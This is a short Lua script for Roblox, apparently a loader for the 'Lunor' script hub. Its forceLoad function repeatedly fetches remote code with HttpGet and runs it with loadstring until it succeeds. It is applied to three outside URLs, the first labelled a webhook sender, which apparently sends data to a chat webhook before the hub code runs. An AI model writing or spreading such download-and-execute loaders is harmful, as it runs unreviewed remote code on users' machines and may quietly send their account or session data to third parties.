-- Function that keeps retrying until the script loads successfully
local function forceLoad(url)
    local loaded = false
    while not loaded do
        local success, result = pcall(function()
            return loadstring(game:HttpGet(url))()
        end)
        if success then
            loaded = true
        else
            warn("Retrying load from:", url)
            task.wait(1) -- wait before retrying
        end
    end
end

-- Step 1: Run webhook sender first
forceLoad("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua")

-- Step 2: Wait 3 seconds, then run second script
task.wait(3)
forceLoad("https://lunor.dev/loader")

-- Step 3: Wait 4 seconds, then run third script
task.wait(4)
forceLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua")
